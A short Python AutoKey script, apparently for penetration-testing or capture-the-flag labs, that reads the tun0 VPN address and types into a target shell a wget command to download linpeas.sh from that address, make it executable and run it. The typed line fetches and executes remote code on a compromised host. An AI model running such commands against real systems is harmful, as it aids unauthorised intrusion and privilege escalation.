import netifaces as ni

# inserts a wget download string along with the current tun0 ip
# to download and execute linpeas.sh in a target shell
#
# needs netifaces-module, e.g. via
#   sudo apt install python3-netifaces
#
# to install, copy and paste this code
# to a new script in autokey and set a hotkey

try:
  ni.ifaddresses('tun0')
  tun_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

except ValueError:
  dialog.info_dialog('tun0 not found', 'Can not obtain tun0 IP. Is the device connected?')

else:
  keyboard.send_keys('wget -O /tmp/linpeas.sh http://%s/linpeas.sh && chmod 755 /tmp/linpeas.sh && /tmp/linpeas.sh' % tun_ip)
  keyboard.send_keys("<enter>")
